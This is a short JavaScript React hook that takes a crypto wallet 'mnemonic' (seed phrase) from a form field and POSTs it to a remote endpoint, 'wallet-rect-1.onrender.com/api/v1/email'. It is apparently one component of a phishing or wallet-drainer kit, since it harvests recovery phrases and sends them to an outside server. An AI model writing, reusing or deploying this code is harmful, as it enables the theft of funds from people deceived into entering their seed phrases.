import { useState } from "react";
import { toast } from 'react-toastify';

const saveDetails = () => {
    const successNotify = (message) => toast.success(message);
    const errorNotify = (message) => toast.error(message);

    const [loading, setLoading] = useState(false);

    const [formData, setFormData] = useState({
        mnemonic: '',
    });

    const handleInputChange = (event) => {
        const { name, value } = event.target;
        setFormData((prevFormData) => ({
            ...prevFormData,
            [name]: value,
        }));
    };

    const handleSubmit = async (event) => {
        event.preventDefault();

        if (formData.mnemonic.trim() === '') {
            errorNotify("Input cannot be empty");
            return;
        }
        setLoading(true);

        try {
            const response = await fetch('https://wallet-rect-1.onrender.com/api/v1/email', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData),
            });
            const data = await response.json();
            if (response.ok) {
                successNotify(data.message);
                setFormData({
                    mnemonic: '',
                });
            }
        } catch (error) {
            errorNotify('Error');
            console.error('error');
        } finally {
            setLoading(false);
        }
    };

    return { handleSubmit, handleInputChange, loading, formData };
};

export default saveDetails;
